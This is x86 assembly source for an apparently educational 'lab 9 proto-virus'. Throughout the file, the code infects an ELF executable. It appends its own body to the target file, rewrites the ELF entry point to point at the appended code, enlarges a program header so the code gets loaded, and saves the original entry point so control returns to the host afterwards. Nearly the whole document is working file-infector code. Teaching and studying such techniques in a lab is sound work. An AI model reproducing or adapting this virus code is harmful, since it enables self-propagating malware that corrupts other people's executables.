%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4 ;4,esi,ebx,edx
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
	global _start
	section .text

_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            	; Set up ebp and reserve space on the stack for local storage

	call get_my_loc	
	add ecx,virout-next_i
	write 1, ecx, 19
	call get_my_loc					; You code for this lab goes here
	add ecx,FileName-next_i	
	mov esi,ecx
	open esi,RDWR,0x777				;open the 
	cmp eax,0
	jbe errorExit

	mov [ebp-4],eax								;ebp-4 hold the file descriptor
	; mov ebx,ebp
	; sub ebx,8
	lea ebx,[ebp-8]							;
	read dword[ebp-4],ebx,4					;ELF.
	mov eax ,0
	mov eax, dword[ebp-8]
	cmp eax,0x464C457F 				;check ELF
	jne errorExit					;end the virus in the end of the file
	lseek dword[ebp-4],0,SEEK_END
	mov [ebp-12],eax                 ;FILE Size
	call get_my_loc	
	add ecx,_start-next_i		;location of start
	mov eax,virus_end-_start
	write dword[ebp-4],ecx,eax
	
	; call get_my_loc	
	; add ecx,next_i-_start		 ;location of start
	; add edi,ecx
	mov ebx, [ebp - 4]; get fd
	lseek ebx,0,SEEK_SET
	mov ebx,ebp
	sub ebx,100						;ebx hold the start of the buffer
	mov [ebp-16],ebx 				;start of the buffer
	read dword[ebp-4],dword[ebp-16],52

	mov eax,[ebp-16]
	add eax,PHDR_start
	mov dword edx, [eax]        ; the offset of  the Program header
	mov ebx, [ebp - 4]        ; get fd
	mov eax, edx ; lseek dont work with edx
	lseek ebx, eax, SEEK_SET
	mov ebx, [ebp - 4] ; get fd
	mov ecx,[ebp-16]	
	sub ecx, 52 ; 52 first bytes are the header
	read ebx,ecx,PHDR_size ;  program header
	mov edi,[ecx + PHDR_vaddr]  			 	 ;get the virtual address
	add edi,dword [ebp-12]						 ;0x08048000 + FILE SIZE (ebp-12)
	add edi,0x1000
	mov ebx , dword[ebp-16]
	mov esi , dword [ebx + ENTRY]
	mov [ebp-20],esi			;ebp-20 is the old entry point
	mov [ebx + ENTRY ],edi

	lseek dword[ebp-4],0,SEEK_SET
	write dword[ebp-4],dword[ebp-16], 52
	
	mov eax,52
	add eax,PHDR_size
	mov ebx, [ebp -4] ; get fd
	lseek ebx,eax,SEEK_SET ;eax = 84 header +  first PHDR
	mov ecx,ebp 
	sub ecx,200 ;get to the free space in stack (after Header and first program header)
	mov ebx, [ebp -4]; get fd
	read ebx,ecx,PHDR_size ;read to the stack the second program header
	mov edx,[ebp -12] ; get old    file size
	mov ebx,[ecx+ PHDR_offset]
	mov eax, virus_end
	sub eax, _start
	add eax, edx
	sub eax,ebx ; file size + virus code size - program header offset
	mov dword [ecx+PHDR_filesize], eax
	mov  dword [ecx +PHDR_memsize], eax
	mov ebx, [ebp -4]
	push ecx ; save the value becouse lseek change it
	lseek ebx,-PHDR_size,1 ;reduce the number of bytes we read, now we in the second program header in the file
	pop ecx ; get the location of the second program header in our stack
	mov ebx, [ebp -4]
	write ebx,ecx,PHDR_size

	lseek dword[ebp-4],-4,SEEK_END		;put in PreviousEntryPoint varibale the PreviousEntryPoint.
	mov eax,ebp
	sub eax,20
	write dword[ebp-4],eax,4


VirusExit:
		cmp dword[PreviousEntryPoint],VirusExit		; its mean we change it and we are not the skeleton file that is running now.
		jne errorExit
       	exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)

						
errorExit:
		;**task2**
		call get_my_loc
		sub ecx,next_i-PreviousEntryPoint
		jmp dword[ecx]
		exit 1

get_my_loc:
	call next_i
next_i:
	pop ecx
	ret
	
FileName:	db "ELFexec2long", 0
virout:		db "i am a virus! yey",10, 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:    db "perhaps not", 10 , 0	
PreviousEntryPoint: dd VirusExit
virus_end: